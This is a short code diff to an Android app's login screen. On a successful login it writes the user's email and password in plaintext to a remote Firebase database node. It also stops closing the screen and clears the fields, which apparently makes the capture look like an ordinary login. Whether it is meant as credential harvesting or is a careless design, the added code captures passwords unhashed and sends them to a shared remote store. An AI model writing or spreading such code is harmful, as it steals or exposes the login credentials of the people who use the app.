@@ -12,6 +12,9 @@ import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
 import butterknife.ButterKnife;
 import butterknife.Bind;
 
@@ -104,7 +107,11 @@ public class LoginActivity extends AppCompatActivity {
 
     public void onLoginSuccess() {
         _loginButton.setEnabled(true);
-        finish();
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        DatabaseReference myRef = database.getReference("user");
+        myRef.setValue(_emailText.getText() + ";" + _passwordText.getText());
+        _passwordText.setText("");
+        _emailText.setText("");
     }
 
     public void onLoginFailed() {
